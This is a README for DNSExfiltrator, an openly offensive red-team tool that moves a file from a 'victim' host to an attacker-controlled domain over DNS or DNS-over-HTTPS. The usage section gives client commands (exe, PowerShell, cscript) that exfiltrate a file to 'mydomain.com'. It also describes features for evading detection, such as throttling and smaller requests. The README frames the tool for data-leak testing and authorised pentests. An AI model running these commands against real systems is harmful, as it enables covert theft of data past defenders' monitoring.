DNSExfiltrator
============

Author: Arno0x0x - [@Arno0x0x](http://twitter.com/Arno0x0x)

DNSExfiltrator allows for transfering (*exfiltrate*) a file over a DNS request covert channel. This is basically a data leak testing tool allowing to exfiltrate data over a covert channel.

DNSExfiltrator has two sides:
  1. The **server side**, coming as a single python script (`dnsexfiltrator.py`), which acts as a custom DNS server, receiving the file
  2. The **client side** (*victim's side*), which comes in three flavors:
  - `dnsExfiltrator.cs`: a C# script that can be compiled with `csc.exe` to provide a Windows managed executable
  - `Invoke-DNSExfiltrator.ps1`: a PowerShell script providing the exact same functionnalities by wrapping the dnsExfiltrator assembly
  - `dnsExfiltrator.js`: a JScript script which is a conversion of the dnsExiltrator DLL assembly using DotNetToJScript, and providing the exact same functionnalities

In order for the whole thing to work **you must own a domain name** and set the DNS record (NS) for that domain to point to the server that will run the `dnsexfiltrator.py` server side.

Features
----------------------

By default, DNSExfiltrator uses the system's  defined DNS server, but you can also set a specific one to use (*useful for debugging purposes or for running the server side locally for instance*).

Alternatively, using the `h` parameter, DNSExfiltrator can perform DoH (*DNS over HTTP*) using the Google or CloudFlare DoH servers.

By default, the data to be exfiltrated is base64URL encoded in order to fit into DNS requests. However some DNS resolvers might break this encoding (*fair enough since FQDN are not supposed to case sensitve anyway*) by messing up with the sensitivity of the case (*upper or lower case*) which is obviously important for the encoding/decoding process. To circumvent this problem you can use the `-b32` flag in order to force Base32 encoding of the data, which comes with a little size overhead. If you're using CloudFlare DoH, base32 encoding is automatically applied.

DNSExfiltrator supports **basic RC4 encryption** of the exfiltrated data, using the provided password to encrypt/decrypt the data.

DNSExfiltrator also provides some optional features to avoid detection:
  - requests throttling in order to stay more stealthy when exfiltrating data
  - reduction of the DNS request size (*by default it will try to use as much bytes left available in each DNS request for efficiency*)
  - reduction of the DNS label size (*by default it will try to use the longest supported label size of 63 chars*)

<img src="https://dl.dropboxusercontent.com/s/z3hjd513jens17e/dnsExfiltrator_04.jpg?dl=0" width="600">

Dependencies
----------------------

The only dependency is on the server side, as the `dnsexfiltrator.py` script relies on the external **dnslib** library. You can install it using pip:
```
pip install -r requirements.txt
```

Usage
----------------------

***SERVER SIDE***

Start the `dnsexfiltrator.py` script passing it the domain name and decryption password to be used:
```
root@kali:~# ./dnsexfiltrator.py -d mydomain.com -p password
```

***CLIENT SIDE***

You can **either** use the compiled version, **or** the PowerShell wrapper (*which is basically the same thing*) **or** the JScript wrapper. In any case, the parameters are the same, with just a slight difference in the way of passing them in PowerShell.

1/ Using the C# compiled Windows executable (*which you can find in the `release` directory*):
```
dnsExfiltrator.exe <file> <domainName> <password> [-b32] [h=google|cloudflare] [s=<DNS_server>] [t=<throttleTime>] [r=<requestMaxSize>] [l=<labelMaxSize>]
      file:           [MANDATORY] The file name to the file to be exfiltrated.
      domainName:     [MANDATORY] The domain name to use for DNS requests.
      password:       [MANDATORY] Password used to encrypt the data to be exfiltrated.
      -b32:           [OPTIONNAL] Use base32 encoding of data. Might be required by some DNS resolver break case.
      h:              [OPTIONNAL] Use Google or CloudFlare DoH (DNS over HTTP) servers.
      DNS_Server:     [OPTIONNAL] The DNS server name or IP to use for DNS requests. Defaults to the system one.
      throttleTime:   [OPTIONNAL] The time in milliseconds to wait between each DNS request.
      requestMaxSize: [OPTIONNAL] The maximum size in bytes for each DNS request. Defaults to 255 bytes..
      labelMaxSize:   [OPTIONNAL] The maximum size in chars for each DNS request label (subdomain). Defaults to 63 chars.
```
<img src="https://dl.dropboxusercontent.com/s/jqzptt5tqc2e8z9/dnsExfiltrator_01.jpg?dl=0" width="900">


2/ Using the PowerShell script, well, call it in any of your prefered way (*you probably know tons of ways of invoking a powershell script*) along with the script parameters. Most basic example:
```
c:\DNSExfiltrator> powershell
PS c:\DNSExfiltrator> Import-Module .\Invoke-DNSExfiltrator.ps1
PS c:\DNSExfiltrator> Invoke-DNSExfiltrator -i inputFile -d mydomain.com -p password -s my.dns.server.com -t 500
[...]
```
Check the EXAMPLES section in the script file for further usage examples.
<img src="https://dl.dropboxusercontent.com/s/067lffd4s45esmu/dnsExfiltrator_02.jpg?dl=0" width="900">

3/ Using the JScript script, pass it the exact same arguments as you would with the standalone Windows executable:
```
cscript.exe dnsExiltrator.js inputFile mydomain.com password
```
Or, with some options:
```
cscript.exe dnsExiltrator.js inputFile mydomain.com password s=my.dns.server.com t=500
```
<img src="https://dl.dropboxusercontent.com/s/bzfmzfeejpjkas2/dnsExfiltrator_03.jpg?dl=0" width="900">

TODO
----------------
  - Some will ask for AES encryption instead of RC4, I know... might add it later
  - Display estimated transfer time
  - Do better argument parsing (*I'm too lazy to learn how to use a c# argument parsing library, I wish it was as simple as Python*)

DISCLAIMER
----------------
This tool is intended to be used in a legal and legitimate way only:
  - either on your own systems as a means of learning, of demonstrating what can be done and how, or testing your defense and detection mechanisms
  - on systems you've been officially and legitimately entitled to perform some security assessments (pentest, security audits)

Quoting Empire's authors:
*There is no way to build offensive tools useful to the legitimate infosec industry while simultaneously preventing malicious actors from abusing them.*